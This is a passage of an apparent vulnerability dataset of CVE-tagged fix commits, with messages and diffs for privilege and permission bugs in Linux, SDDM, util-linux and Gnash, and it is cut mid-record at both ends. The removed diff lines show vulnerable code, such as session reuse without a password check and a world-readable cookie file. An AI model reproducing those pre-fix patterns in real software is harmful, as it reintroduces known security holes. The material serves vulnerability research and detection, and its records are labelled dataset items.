0;\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-4470","CWE_ID":"264","category":"security","commit_id":"e93b7d748be887cd7639b113ba7d7ef792a7efb9","commit_message":"From e93b7d748be887cd7639b113ba7d7ef792a7efb9 Mon Sep 17 00:00:00 2001\nFrom: Jiri Pirko <jiri@resnulli.us>\nDate: Sat, 19 Oct 2013 12:29:17 +0200\nSubject: ip_output: do skb ufo init for peeked non ufo skb as well\n\nNow, if user application does:\nsendto len<mtu flag MSG_MORE\nsendto len>mtu flag 0\nThe skb is not treated as fragmented one because it is not initialized\nthat way. So move the initialization to fix this.\n\nintroduced by:\ncommit e89e9cf539a28df7d0eb1d0a545368e9920b34ac \"[IPv4\/IPv6]: UFO Scatter-gather approach\"\n\nSigned-off-by: Jiri Pirko <jiri@resnulli.us>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv4\/ip_output.c | 13 +++++++++----\n 1 file changed, 9 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/net\/ipv4\/ip_output.c b\/net\/ipv4\/ip_output.c\nindex a04d872c54f9..3982eabf61e1 100644\n--- a\/net\/ipv4\/ip_output.c\n+++ b\/net\/ipv4\/ip_output.c\n@@ -772,15 +772,20 @@ static inline int ip_ufo_append_data(struct sock *sk,\n \t\t\/* initialize protocol header pointer *\/\n \t\tskb->transport_header = skb->network_header + fragheaderlen;\n \n-\t\tskb->ip_summed = CHECKSUM_PARTIAL;\n \t\tskb->csum = 0;\n \n-\t\t\/* specify the length of each IP datagram fragment *\/\n-\t\tskb_shinfo(skb)->gso_size = maxfraglen - fragheaderlen;\n-\t\tskb_shinfo(skb)->gso_type = SKB_GSO_UDP;\n+\n \t\t__skb_queue_tail(queue, skb);\n+\t} else if (skb_is_gso(skb)) {\n+\t\tgoto append;\n \t}\n \n+\tskb->ip_summed = CHECKSUM_PARTIAL;\n+\t\/* specify the length of each IP datagram fragment *\/\n+\tskb_shinfo(skb)->gso_size = maxfraglen - fragheaderlen;\n+\tskb_shinfo(skb)->gso_type = SKB_GSO_UDP;\n+\n+append:\n \treturn skb_append_datato_frags(sk, skb, getfrag, from,\n \t\t\t\t       (length - transhdrlen));\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-14345","CWE_ID":"264","category":"security","commit_id":"147cec383892d143b5e02daa70f1e7def50f5d98","commit_message":"From 147cec383892d143b5e02daa70f1e7def50f5d98 Mon Sep 17 00:00:00 2001\nFrom: Fabian Vogt <fabian@ritter-vogt.de>\nDate: Wed, 11 Jul 2018 19:45:40 +0200\nSubject: [PATCH] Fix authentication when reusing an existing session\n\n- Check the success value before unlocking the session\n- Don't attempt to use the nonexistant \"sddm-check\" PAM service\n---\n src\/daemon\/Display.cpp            | 4 +++-\n src\/helper\/backend\/PamBackend.cpp | 2 --\n 2 files changed, 3 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/src\/daemon\/Display.cpp b\/src\/daemon\/Display.cpp\nindex 5abfc9a2..57d7ecbf 100644\n--- a\/src\/daemon\/Display.cpp\n+++ b\/src\/daemon\/Display.cpp\n@@ -339,7 +339,9 @@ namespace SDDM {\n         } else {\n             \/\/we only want to unlock the session if we can lock in, so we want to go via PAM auth, but not start a new session\n             \/\/by not setting the session and the helper will emit authentication and then quit\n-            connect(m_auth, &Auth::authentication, this, [=](){\n+            connect(m_auth, &Auth::authentication, this, [=](const QString &, bool success){\n+                if(!success)\n+                    return;\n                 qDebug() << \"activating existing seat\";\n                 OrgFreedesktopLogin1ManagerInterface manager(Logind::serviceName(), Logind::managerPath(), QDBusConnection::systemBus());\n                 manager.UnlockSession(existingSessionId);\ndiff --git a\/src\/helper\/backend\/PamBackend.cpp b\/src\/helper\/backend\/PamBackend.cpp\nindex 69cbd2ce..54672829 100644\n--- a\/src\/helper\/backend\/PamBackend.cpp\n+++ b\/src\/helper\/backend\/PamBackend.cpp\n@@ -219,8 +219,6 @@ namespace SDDM {\n \n         if (user == QStringLiteral(\"sddm\") && m_greeter)\n             service = QStringLiteral(\"sddm-greeter\");\n-        else if (m_app->session()->path().isEmpty())\n-            service = QStringLiteral(\"sddm-check\");\n         else if (m_autologin)\n             service = QStringLiteral(\"sddm-autologin\");\n         result = m_pam->start(service, user);\n","owner":"sddm","repo":"sddm","source":"cve"},{"CVE_ID":"CVE-2014-9090","CWE_ID":"264","category":"security","commit_id":"6f442be2fb22be02cafa606f1769fa1e6f894441","commit_message":"From 6f442be2fb22be02cafa606f1769fa1e6f894441 Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Sat, 22 Nov 2014 18:00:32 -0800\nSubject: x86_64, traps: Stop using IST for #SS\n\nOn a 32-bit kernel, this has no effect, since there are no IST stacks.\n\nOn a 64-bit kernel, #SS can only happen in user code, on a failed iret\nto user space, a canonical violation on access via RSP or RBP, or a\ngenuine stack segment violation in 32-bit kernel code.  The first two\ncases don't need IST, and the latter two cases are unlikely fatal bugs,\nand promoting them to double faults would be fine.\n\nThis fixes a bug in which the espfix64 code mishandles a stack segment\nviolation.\n\nThis saves 4k of memory per CPU and a tiny bit of code.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nReviewed-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/x86\/include\/asm\/page_32_types.h |  1 -\n arch\/x86\/include\/asm\/page_64_types.h | 11 +++++------\n arch\/x86\/include\/asm\/traps.h         |  1 +\n arch\/x86\/kernel\/dumpstack_64.c       |  1 -\n arch\/x86\/kernel\/entry_64.S           |  2 +-\n arch\/x86\/kernel\/traps.c              | 18 +-----------------\n 6 files changed, 8 insertions(+), 26 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/asm\/page_32_types.h b\/arch\/x86\/include\/asm\/page_32_types.h\nindex f48b17df4224..3a52ee0e726d 100644\n--- a\/arch\/x86\/include\/asm\/page_32_types.h\n+++ b\/arch\/x86\/include\/asm\/page_32_types.h\n@@ -20,7 +20,6 @@\n #define THREAD_SIZE_ORDER\t1\n #define THREAD_SIZE\t\t(PAGE_SIZE << THREAD_SIZE_ORDER)\n \n-#define STACKFAULT_STACK 0\n #define DOUBLEFAULT_STACK 1\n #define NMI_STACK 0\n #define DEBUG_STACK 0\ndiff --git a\/arch\/x86\/include\/asm\/page_64_types.h b\/arch\/x86\/include\/asm\/page_64_types.h\nindex 678205195ae1..75450b2c7be4 100644\n--- a\/arch\/x86\/include\/asm\/page_64_types.h\n+++ b\/arch\/x86\/include\/asm\/page_64_types.h\n@@ -14,12 +14,11 @@\n #define IRQ_STACK_ORDER 2\n #define IRQ_STACK_SIZE (PAGE_SIZE << IRQ_STACK_ORDER)\n \n-#define STACKFAULT_STACK 1\n-#define DOUBLEFAULT_STACK 2\n-#define NMI_STACK 3\n-#define DEBUG_STACK 4\n-#define MCE_STACK 5\n-#define N_EXCEPTION_STACKS 5  \/* hw limit: 7 *\/\n+#define DOUBLEFAULT_STACK 1\n+#define NMI_STACK 2\n+#define DEBUG_STACK 3\n+#define MCE_STACK 4\n+#define N_EXCEPTION_STACKS 4  \/* hw limit: 7 *\/\n \n #define PUD_PAGE_SIZE\t\t(_AC(1, UL) << PUD_SHIFT)\n #define PUD_PAGE_MASK\t\t(~(PUD_PAGE_SIZE-1))\ndiff --git a\/arch\/x86\/include\/asm\/traps.h b\/arch\/x86\/include\/asm\/traps.h\nindex bc8352e7010a..707adc6549d8 100644\n--- a\/arch\/x86\/include\/asm\/traps.h\n+++ b\/arch\/x86\/include\/asm\/traps.h\n@@ -39,6 +39,7 @@ asmlinkage void simd_coprocessor_error(void);\n \n #ifdef CONFIG_TRACING\n asmlinkage void trace_page_fault(void);\n+#define trace_stack_segment stack_segment\n #define trace_divide_error divide_error\n #define trace_bounds bounds\n #define trace_invalid_op invalid_op\ndiff --git a\/arch\/x86\/kernel\/dumpstack_64.c b\/arch\/x86\/kernel\/dumpstack_64.c\nindex 1abcb50b48ae..ff86f19b5758 100644\n--- a\/arch\/x86\/kernel\/dumpstack_64.c\n+++ b\/arch\/x86\/kernel\/dumpstack_64.c\n@@ -24,7 +24,6 @@ static char x86_stack_ids[][8] = {\n \t\t[ DEBUG_STACK-1\t\t\t]\t= \"#DB\",\n \t\t[ NMI_STACK-1\t\t\t]\t= \"NMI\",\n \t\t[ DOUBLEFAULT_STACK-1\t\t]\t= \"#DF\",\n-\t\t[ STACKFAULT_STACK-1\t\t]\t= \"#SS\",\n \t\t[ MCE_STACK-1\t\t\t]\t= \"#MC\",\n #if DEBUG_STKSZ > EXCEPTION_STKSZ\n \t\t[ N_EXCEPTION_STACKS ...\ndiff --git a\/arch\/x86\/kernel\/entry_64.S b\/arch\/x86\/kernel\/entry_64.S\nindex a4dc8de7c4be..49a0c1781253 100644\n--- a\/arch\/x86\/kernel\/entry_64.S\n+++ b\/arch\/x86\/kernel\/entry_64.S\n@@ -1259,7 +1259,7 @@ apicinterrupt3 HYPERVISOR_CALLBACK_VECTOR \\\n \n idtentry debug do_debug has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK\n idtentry int3 do_int3 has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK\n-idtentry stack_segment do_stack_segment has_error_code=1 paranoid=1\n+idtentry stack_segment do_stack_segment has_error_code=1\n #ifdef CONFIG_XEN\n idtentry xen_debug do_debug has_error_code=0\n idtentry xen_int3 do_int3 has_error_code=0\ndiff --git a\/arch\/x86\/kernel\/traps.c b\/arch\/x86\/kernel\/traps.c\nindex 819662746e23..48035e9cdde9 100644\n--- a\/arch\/x86\/kernel\/traps.c\n+++ b\/arch\/x86\/kernel\/traps.c\n@@ -233,27 +233,11 @@ DO_ERROR(X86_TRAP_UD,     SIGILL,  \"invalid opcode\",\t\tinvalid_op)\n DO_ERROR(X86_TRAP_OLD_MF, SIGFPE,  \"coprocessor segment overrun\",coprocessor_segment_overrun)\n DO_ERROR(X86_TRAP_TS,     SIGSEGV, \"invalid TSS\",\t\tinvalid_TSS)\n DO_ERROR(X86_TRAP_NP,     SIGBUS,  \"segment not present\",\tsegment_not_present)\n-#ifdef CONFIG_X86_32\n DO_ERROR(X86_TRAP_SS,     SIGBUS,  \"stack segment\",\t\tstack_segment)\n-#endif\n DO_ERROR(X86_TRAP_AC,     SIGBUS,  \"alignment check\",\t\talignment_check)\n \n #ifdef CONFIG_X86_64\n \/* Runs on IST stack *\/\n-dotraplinkage void do_stack_segment(struct pt_regs *regs, long error_code)\n-{\n-\tenum ctx_state prev_state;\n-\n-\tprev_state = exception_enter();\n-\tif (notify_die(DIE_TRAP, \"stack segment\", regs, error_code,\n-\t\t       X86_TRAP_SS, SIGBUS) != NOTIFY_STOP) {\n-\t\tpreempt_conditional_sti(regs);\n-\t\tdo_trap(X86_TRAP_SS, SIGBUS, \"stack segment\", regs, error_code, NULL);\n-\t\tpreempt_conditional_cli(regs);\n-\t}\n-\texception_exit(prev_state);\n-}\n-\n dotraplinkage void do_double_fault(struct pt_regs *regs, long error_code)\n {\n \tstatic const char str[] = \"double fault\";\n@@ -802,7 +786,7 @@ void __init trap_init(void)\n \tset_intr_gate(X86_TRAP_OLD_MF, coprocessor_segment_overrun);\n \tset_intr_gate(X86_TRAP_TS, invalid_TSS);\n \tset_intr_gate(X86_TRAP_NP, segment_not_present);\n-\tset_intr_gate_ist(X86_TRAP_SS, &stack_segment, STACKFAULT_STACK);\n+\tset_intr_gate(X86_TRAP_SS, stack_segment);\n \tset_intr_gate(X86_TRAP_GP, general_protection);\n \tset_intr_gate(X86_TRAP_SPURIOUS, spurious_interrupt_bug);\n \tset_intr_gate(X86_TRAP_MF, coprocessor_error);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-1585","CWE_ID":"264","category":"security","commit_id":"4ff67b720c02c36e54d55b88c2931879b7db1cd2","commit_message":"From 4ff67b720c02c36e54d55b88c2931879b7db1cd2 Mon Sep 17 00:00:00 2001\nFrom: Jeff Layton <jlayton@redhat.com>\nDate: Tue, 6 Jul 2010 20:43:02 -0400\nSubject: [PATCH] cifs: clean up cifs_find_smb_ses (try #2)\n\nThis patch replaces the earlier patch by the same name. The only\ndifference is that MAX_PASSWORD_SIZE has been increased to attempt to\nmatch the limits that windows enforces.\n\nDo a better job of matching sessions by authtype. Matching by username\nfor a Kerberos session is incorrect, and anonymous sessions need special\nhandling.\n\nAlso, in the case where we do match by username, we also need to match\nby password. That ensures that someone else doesn't \"borrow\" an existing\nsession without needing to know the password.\n\nFinally, passwords can be longer than 16 bytes. Bump MAX_PASSWORD_SIZE\nto 512 to match the size that the userspace mount helper allows.\n\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>\n---\n fs\/cifs\/cifsglob.h |  2 +-\n fs\/cifs\/connect.c  | 26 ++++++++++++++++++--------\n 2 files changed, 19 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/fs\/cifs\/cifsglob.h b\/fs\/cifs\/cifsglob.h\nindex 8fb1d10b8742b..7b91cb4f0da4e 100644\n--- a\/fs\/cifs\/cifsglob.h\n+++ b\/fs\/cifs\/cifsglob.h\n@@ -37,7 +37,7 @@\n #define MAX_SHARE_SIZE  64\t\/* used to be 20, this should still be enough *\/\n #define MAX_USERNAME_SIZE 32\t\/* 32 is to allow for 15 char names + null\n \t\t\t\t   termination then *2 for unicode versions *\/\n-#define MAX_PASSWORD_SIZE 16\n+#define MAX_PASSWORD_SIZE 512  \/* max for windows seems to be 256 wide chars *\/\n \n #define CIFS_MIN_RCV_POOL 4\n \ndiff --git a\/fs\/cifs\/connect.c b\/fs\/cifs\/connect.c\nindex b24e4cea4e3c8..b2063ce113ec9 100644\n--- a\/fs\/cifs\/connect.c\n+++ b\/fs\/cifs\/connect.c\n@@ -1644,17 +1644,27 @@ cifs_get_tcp_session(struct smb_vol *volume_info)\n }\n \n static struct cifsSesInfo *\n-cifs_find_smb_ses(struct TCP_Server_Info *server, char *username)\n+cifs_find_smb_ses(struct TCP_Server_Info *server, struct smb_vol *vol)\n {\n-\tstruct list_head *tmp;\n \tstruct cifsSesInfo *ses;\n \n \twrite_lock(&cifs_tcp_ses_lock);\n-\tlist_for_each(tmp, &server->smb_ses_list) {\n-\t\tses = list_entry(tmp, struct cifsSesInfo, smb_ses_list);\n-\t\tif (strncmp(ses->userName, username, MAX_USERNAME_SIZE))\n-\t\t\tcontinue;\n-\n+\tlist_for_each_entry(ses, &server->smb_ses_list, smb_ses_list) {\n+\t\tswitch (server->secType) {\n+\t\tcase Kerberos:\n+\t\t\tif (vol->linux_uid != ses->linux_uid)\n+\t\t\t\tcontinue;\n+\t\t\tbreak;\n+\t\tdefault:\n+\t\t\t\/* anything else takes username\/password *\/\n+\t\t\tif (strncmp(ses->userName, vol->username,\n+\t\t\t\t    MAX_USERNAME_SIZE))\n+\t\t\t\tcontinue;\n+\t\t\tif (strlen(vol->username) != 0 &&\n+\t\t\t    strncmp(ses->password, vol->password,\n+\t\t\t\t    MAX_PASSWORD_SIZE))\n+\t\t\t\tcontinue;\n+\t\t}\n \t\t++ses->ses_count;\n \t\twrite_unlock(&cifs_tcp_ses_lock);\n \t\treturn ses;\n@@ -1696,7 +1706,7 @@ cifs_get_smb_ses(struct TCP_Server_Info *server, struct smb_vol *volume_info)\n \n \txid = GetXid();\n \n-\tses = cifs_find_smb_ses(server, volume_info->username);\n+\tses = cifs_find_smb_ses(server, volume_info);\n \tif (ses) {\n \t\tcFYI(1, \"Existing smb sess found (status=%d)\", ses->status);\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-5224","CWE_ID":"264","category":"security","commit_id":"bde91c85bdc77975155058276f99d2e0f5eab5a9","commit_message":"From bde91c85bdc77975155058276f99d2e0f5eab5a9 Mon Sep 17 00:00:00 2001\nFrom: Karel Zak <kzak@redhat.com>\nDate: Mon, 24 Aug 2015 10:05:55 +0200\nSubject: [PATCH] chsh, chfn, vipw: fix filenames collision\n\nThe utils when compiled WITHOUT libuser then mkostemp()ing\n\"\/etc\/%s.XXXXXX\" where the filename prefix is argv[0] basename.\n\nAn attacker could repeatedly execute the util with modified argv[0]\nand after many many attempts mkostemp() may generate suffix which\nmakes sense. The result maybe temporary file with name like rc.status\nld.so.preload or krb5.keytab, etc.\n\nNote that distros usually use libuser based ch{sh,fn} or stuff from\nshadow-utils.\n\nIt's probably very minor security bug.\n\nAddresses: CVE-2015-5224\nSigned-off-by: Karel Zak <kzak@redhat.com>\n---\n include\/fileutils.h    |  6 +++---\n lib\/fileutils.c        | 21 +++++++--------------\n login-utils\/chfn.c     |  2 +-\n login-utils\/chsh.c     |  2 +-\n login-utils\/setpwnam.c |  5 ++---\n login-utils\/setpwnam.h |  6 +++++-\n login-utils\/vipw.c     |  3 +--\n 7 files changed, 20 insertions(+), 25 deletions(-)\n\n","diff_code":"diff --git a\/include\/fileutils.h b\/include\/fileutils.h\nindex e0e2ecee1..be6d1f7f9 100644\n--- a\/include\/fileutils.h\n+++ b\/include\/fileutils.h\n@@ -7,14 +7,14 @@\n \n #include \"c.h\"\n \n-extern int xmkstemp(char **tmpname, char *dir);\n+extern int xmkstemp(char **tmpname, const char *dir, const char *prefix);\n \n-static inline FILE *xfmkstemp(char **tmpname, char *dir)\n+static inline FILE *xfmkstemp(char **tmpname, const char *dir, const char *prefix)\n {\n \tint fd;\n \tFILE *ret;\n \n-\tfd = xmkstemp(tmpname, dir);\n+\tfd = xmkstemp(tmpname, dir, prefix);\n \tif (fd == -1)\n \t\treturn NULL;\n \ndiff --git a\/lib\/fileutils.c b\/lib\/fileutils.c\nindex 81b38ad3a..bf8e60a4b 100644\n--- a\/lib\/fileutils.c\n+++ b\/lib\/fileutils.c\n@@ -15,27 +15,20 @@\n \n \/* Create open temporary file in safe way.  Please notice that the\n  * file permissions are -rw------- by default. *\/\n-int xmkstemp(char **tmpname, char *dir)\n+int xmkstemp(char **tmpname, const char *dir, const char *prefix)\n {\n \tchar *localtmp;\n-\tchar *tmpenv;\n+\tconst char *tmpenv;\n \tmode_t old_mode;\n \tint fd, rc;\n \n \t\/* Some use cases must be capable of being moved atomically\n \t * with rename(2), which is the reason why dir is here.  *\/\n-\tif (dir != NULL)\n-\t\ttmpenv = dir;\n-\telse\n-\t\ttmpenv = getenv(\"TMPDIR\");\n-\n-\tif (tmpenv)\n-\t\trc = asprintf(&localtmp, \"%s\/%s.XXXXXX\", tmpenv,\n-\t\t\t  program_invocation_short_name);\n-\telse\n-\t\trc = asprintf(&localtmp, \"%s\/%s.XXXXXX\", _PATH_TMP,\n-\t\t\t  program_invocation_short_name);\n+\ttmpenv = dir ? dir : getenv(\"TMPDIR\");\n+\tif (!tmpenv)\n+\t\ttmpenv = _PATH_TMP;\n \n+\trc = asprintf(&localtmp, \"%s\/%s.XXXXXX\", tmpenv, prefix);\n \tif (rc < 0)\n \t\treturn -1;\n \n@@ -107,7 +100,7 @@ int main(void)\n {\n \tFILE *f;\n \tchar *tmpname;\n-\tf = xfmkstemp(&tmpname, NULL);\n+\tf = xfmkstemp(&tmpname, NULL, \"test\");\n \tunlink(tmpname);\n \tfree(tmpname);\n \tfclose(f);\ndiff --git a\/login-utils\/chfn.c b\/login-utils\/chfn.c\nindex ac0a3cbde..b1c7ea25a 100644\n--- a\/login-utils\/chfn.c\n+++ b\/login-utils\/chfn.c\n@@ -373,7 +373,7 @@ static int save_new_data(struct chfn_control *ctl)\n #else \/* HAVE_LIBUSER *\/\n \t\/* write the new struct passwd to the passwd file. *\/\n \tctl->pw->pw_gecos = gecos;\n-\tif (setpwnam(ctl->pw) < 0) {\n+\tif (setpwnam(ctl->pw, \".chfn\") < 0) {\n \t\twarn(\"setpwnam failed\");\n #endif\n \t\tprintf(_\ndiff --git a\/login-utils\/chsh.c b\/login-utils\/chsh.c\nindex f4455d7e2..d74a1f0f1 100644\n--- a\/login-utils\/chsh.c\n+++ b\/login-utils\/chsh.c\n@@ -323,7 +323,7 @@ int main(int argc, char **argv)\n \t\terrx(EXIT_FAILURE, _(\"Shell *NOT* changed.  Try again later.\"));\n #else\n \tpw->pw_shell = info.shell;\n-\tif (setpwnam(pw) < 0)\n+\tif (setpwnam(pw, \".chsh\") < 0)\n \t\terr(EXIT_FAILURE, _(\"setpwnam failed\\n\"\n \t\t\t\"Shell *NOT* changed.  Try again later.\"));\n #endif\ndiff --git a\/login-utils\/setpwnam.c b\/login-utils\/setpwnam.c\nindex 79f3299d4..9f39d0181 100644\n--- a\/login-utils\/setpwnam.c\n+++ b\/login-utils\/setpwnam.c\n@@ -71,7 +71,7 @@ static void pw_init(void);\n  *\tIf the given username exists in the passwd file, the entry is\n  *\treplaced with the given entry.\n  *\/\n-int setpwnam(struct passwd *pwd)\n+int setpwnam(struct passwd *pwd, const char *prefix)\n {\n \tFILE *fp = NULL, *pwf = NULL;\n \tint save_errno;\n@@ -81,11 +81,10 @@ int setpwnam(struct passwd *pwd)\n \tint contlen, rc;\n \tchar *linebuf = NULL;\n \tchar *tmpname = NULL;\n-\tchar *atomic_dir = \"\/etc\";\n \n \tpw_init();\n \n-\tif ((fp = xfmkstemp(&tmpname, atomic_dir)) == NULL)\n+\tif ((fp = xfmkstemp(&tmpname, \"\/etc\", prefix)) == NULL)\n \t\treturn -1;\n \n \t\/* ptmp should be owned by root.root or root.wheel *\/\ndiff --git a\/login-utils\/setpwnam.h b\/login-utils\/setpwnam.h\nindex 7d69445e8..95785923f 100644\n--- a\/login-utils\/setpwnam.h\n+++ b\/login-utils\/setpwnam.h\n@@ -11,6 +11,8 @@\n  *  published by the Free Software Foundation; either version 2 of the\n  *  License, or (at your option) any later version.\n  *\/\n+#ifndef UTIL_LINUX_SETPWNAM_H\n+#define UTIL_LINUX_SETPWNAM_H\n \n #include \"pathnames.h\"\n \n@@ -26,4 +28,6 @@\n # define SGROUP_FILE\t\"\/tmp\/gshadow\"\n #endif\n \n-extern int setpwnam (struct passwd *pwd);\n+extern int setpwnam (struct passwd *pwd, const char *prefix);\n+\n+#endif \/* UTIL_LINUX_SETPWNAM_H *\/\ndiff --git a\/login-utils\/vipw.c b\/login-utils\/vipw.c\nindex 9fb25502c..a3c932f16 100644\n--- a\/login-utils\/vipw.c\n+++ b\/login-utils\/vipw.c\n@@ -135,9 +135,8 @@ static FILE * pw_tmpfile(int lockfd)\n {\n \tFILE *fd;\n \tchar *tmpname = NULL;\n-\tchar *dir = \"\/etc\";\n \n-\tif ((fd = xfmkstemp(&tmpname, dir)) == NULL) {\n+\tif ((fd = xfmkstemp(&tmpname, \"\/etc\", \".vipw\")) == NULL) {\n \t\tulckpwdf();\n \t\terr(EXIT_FAILURE, _(\"can't open temporary file\"));\n \t}\n","owner":"karelzak","repo":"util-linux","source":"cve"},{"CVE_ID":"CVE-2011-4328","CWE_ID":"264","category":"security","commit_id":"fa481c116e65ccf9137c7ddc8abc3cf05dc12f55","commit_message":"From fa481c116e65ccf9137c7ddc8abc3cf05dc12f55 Mon Sep 17 00:00:00 2001\nFrom: Gabriele Giacone <1o5g4r8o@gmail.com>\nDate: Sun, 20 Nov 2011 17:27:42 +0100\nSubject: [PATCH] Make cookie file not world-readable. Fixes\n http:\/\/bugs.debian.org\/649384\n\n---\n plugin\/npapi\/plugin.cpp | 1 +\n 1 file changed, 1 insertion(+)\n\n","diff_code":"diff --git a\/plugin\/npapi\/plugin.cpp b\/plugin\/npapi\/plugin.cpp\nindex e161a1d..04950e6 100644\n--- a\/plugin\/npapi\/plugin.cpp\n+++ b\/plugin\/npapi\/plugin.cpp\n@@ -1108,6 +1108,7 @@ nsPluginInstance::setupCookies(const std::string& pageurl)\n     ss << \"\/tmp\/gnash-cookies.\" << getpid();\n \n     cookiefile.open(ss.str().c_str(), std::ios::out | std::ios::trunc);\n+    chmod (ss.str().c_str(), 0600);\n \n     \/\/ Firefox provides cookies in the following format:\n     \/\/\n-- \n1.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-1956","CWE_ID":"264","category":"security","commit_id":"3151527ee007b73a0ebd296010f1c0454a919c7d","commit_message":"From 3151527ee007b73a0ebd296010f1c0454a919c7d Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Fri, 15 Mar 2013 01:45:51 -0700\nSubject: userns:  Don't allow creation if the user is chrooted\n\nGuarantee that the policy of which files may be access that is\nestablished by setting the root directory will not be violated\nby user namespaces by verifying that the root directory points\nto the root of the mount namespace at the time of user namespace\ncreation.\n\nChanging the root is a privileged operation, and as a matter of policy\nit serves to limit unprivileged processes to files below the current\nroot directory.\n\nFor reasons of simplicity and comprehensibility the privilege to\nchange the root directory is gated solely on the CAP_SYS_CHROOT\ncapability in the user namespace.  Therefore when creating a user\nnamespace we must ensure that the policy of which files may be access\ncan not be violated by changing the root directory.\n\nAnyone who runs a processes in a chroot and would like to use user\nnamespace can setup the same view of filesystems with a mount\nnamespace instead.  With this result that this is not a practical\nlimitation for using user namespaces.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\n---\n fs\/namespace.c            | 24 ++++++++++++++++++++++++\n include\/linux\/fs_struct.h |  2 ++\n kernel\/user_namespace.c   |  9 +++++++++\n 3 files changed, 35 insertions(+)\n\n","diff_code":"diff --git a\/fs\/namespace.c b\/fs\/namespace.c\nindex 50ca17d3cb45..a3035223d421 100644\n--- a\/fs\/namespace.c\n+++ b\/fs\/namespace.c\n@@ -2732,6 +2732,30 @@ bool our_mnt(struct vfsmount *mnt)\n \treturn check_mnt(real_mount(mnt));\n }\n \n+bool current_chrooted(void)\n+{\n+\t\/* Does the current process have a non-standard root *\/\n+\tstruct path ns_root;\n+\tstruct path fs_root;\n+\tbool chrooted;\n+\n+\t\/* Find the namespace root *\/\n+\tns_root.mnt = &current->nsproxy->mnt_ns->root->mnt;\n+\tns_root.dentry = ns_root.mnt->mnt_root;\n+\tpath_get(&ns_root);\n+\twhile (d_mountpoint(ns_root.dentry) && follow_down_one(&ns_root))\n+\t\t;\n+\n+\tget_fs_root(current->fs, &fs_root);\n+\n+\tchrooted = !path_equal(&fs_root, &ns_root);\n+\n+\tpath_put(&fs_root);\n+\tpath_put(&ns_root);\n+\n+\treturn chrooted;\n+}\n+\n static void *mntns_get(struct task_struct *task)\n {\n \tstruct mnt_namespace *ns = NULL;\ndiff --git a\/include\/linux\/fs_struct.h b\/include\/linux\/fs_struct.h\nindex 729eded4b24f..2b93a9a5a1e6 100644\n--- a\/include\/linux\/fs_struct.h\n+++ b\/include\/linux\/fs_struct.h\n@@ -50,4 +50,6 @@ static inline void get_fs_root_and_pwd(struct fs_struct *fs, struct path *root,\n \tspin_unlock(&fs->lock);\n }\n \n+extern bool current_chrooted(void);\n+\n #endif \/* _LINUX_FS_STRUCT_H *\/\ndiff --git a\/kernel\/user_namespace.c b\/kernel\/user_namespace.c\nindex b14f4d342043..0f1e42884577 100644\n--- a\/kernel\/user_namespace.c\n+++ b\/kernel\/user_namespace.c\n@@ -61,6 +61,15 @@ int create_user_ns(struct cred *new)\n \tkgid_t group = new->egid;\n \tint ret;\n \n+\t\/*\n+\t * Verify that we can not violate the policy of which files\n+\t * may be accessed that is specified by the root directory,\n+\t * by verifing that the root directory is at the root of the\n+\t * mount namespace which allows all files to be accessed.\n+\t *\/\n+\tif (current_chrooted())\n+\t\treturn -EPERM;\n+\n \t\/* The creator needs a mapping in the parent user namespace\n \t * or else we won't be able to reasonably tell userspace who\n \t * created a user_namespace.\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-2686","CWE_ID":"264","category":"security","commit_id":"4de930efc23b92ddf88ce91c405ee645fe6e27ea","commit_message":"From 4de930efc23b92ddf88ce91c405ee645fe6e27ea Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@ZenIV.linux.org.uk>\nDate: Fri, 20 Mar 2015 17:41:43 +0000\nSubject: [PATCH] net: validate the range we feed to iov_iter_init() in\n sys_sendto\/sys_recvfrom\n\nCc: stable@vger.kernel.org # v3.19\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/socket.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/net\/socket.c b\/net\/socket.c\nindex bbedbfcb42c25..245330ca0015c 100644\n--- a\/net\/socket.c\n+++ b\/net\/socket.c\n@@ -1702,6 +1702,8 @@ SYSCALL_DEFINE6(sendto, int, fd, void __user *, buff, size_t, len,\n \n \tif (len > INT_MAX)\n \t\tlen = INT_MAX;\n+\tif (unlikely(!access_ok(VERIFY_READ, buff, len)))\n+\t\treturn -EFAULT;\n \tsock = sockfd_lookup_light(fd, &err, &fput_needed);\n \tif (!sock)\n \t\tgoto out;\n@@ -1760,6 +1762,8 @@ SYSCALL_DEFINE6(recvfrom, int, fd, void __user *, ubuf, size_t, size,\n \n \tif (size > INT_MAX)\n \t\tsize = INT_MAX;\n+\tif (unlikely(!access_ok(VERIFY_WRITE, ubuf, size)))\n+\t\treturn -EFAULT;\n \tsock = sockfd_lookup_light(fd, &err, &fput_needed);\n \tif 